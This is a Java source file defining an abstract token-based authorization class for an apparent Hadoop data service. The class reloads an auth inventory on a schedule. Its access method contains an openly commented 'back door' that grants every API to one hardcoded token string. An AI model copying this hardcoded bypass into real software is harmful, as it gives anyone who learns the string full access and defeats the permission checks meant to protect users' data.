/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package umc.cdc.hds.auth;

import java.io.Closeable;
import java.io.IOException;
import java.util.Optional;
import java.util.Set;
import java.util.concurrent.TimeUnit;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.apache.hadoop.conf.Configuration;
import org.apache.hadoop.fs.Path;
import umc.cdc.hds.core.Api;
import umc.cdc.hds.core.HDSConstants;
import umc.cdc.hds.tools.ThreadPoolManager;

/**
 *
 * @author brandboat
 */
public abstract class AbstractAuth implements Auth, Closeable {

  private static final Log LOG = LogFactory.getLog(AbstractAuth.class);
  private AuthInventory ai;
  private final boolean enableAuth;
  private final long updatePeriod;
  private Path filePath;
  protected Configuration conf;

  public AbstractAuth(Configuration conf) throws IOException {
    this.conf = conf;
    enableAuth = conf.getBoolean(HDSConstants.HDS_AUTH_ENABLE,
        HDSConstants.DEFAULT_HDS_AUTH_ENABLE);
    updatePeriod = conf.getLong(HDSConstants.HDS_AUTH_UPDATE_PERIOD,
        HDSConstants.DEFAULT_HDS_AUTH_UPDATE_PERIOD);
    if (enableAuth) {
      String path = conf.get(HDSConstants.HDS_AUTH_FILE_LOCATION);
      if (path == null) {
        throw new IOException("Hds Auth file location not specified.");
      }
      filePath = new Path(path);
      if (!authExisted(filePath)) {
        throw new IOException("Hds Auth file not exist.");
      }
      ai = loadAuth(filePath);
      ThreadPoolManager.scheduleWithFixedDelay(()
          -> {
        try {
          if (authChanged(filePath)) {
            ai = loadAuth(filePath);
          }
        } catch (Exception ex) {
          LOG.error("Auth update error.", ex);
        }
      }, updatePeriod, TimeUnit.SECONDS);
    }
  }

  protected abstract AuthInventory loadAuth(Path path) throws IOException;

  protected abstract boolean authExisted(Path path) throws IOException;

  protected abstract boolean authChanged(Path path) throws IOException;

  @Override
  public boolean access(String token, Api api) {
    if (!enableAuth) {
      return true;
    }
    // back door for all internal apis.
    if (token.equals("sweatshopsdslab")) {
      return true;
    }
    Optional<AuthInfo> auth = ai.getAuth(token);
    if (!auth.isPresent()) {
      return false;
    } else {
      AuthInfo au = auth.get();
      Set<Api> apis = au.getApi();
      return apis.contains(api);
    }
  }

  @Override
  public void close() {
  }
}
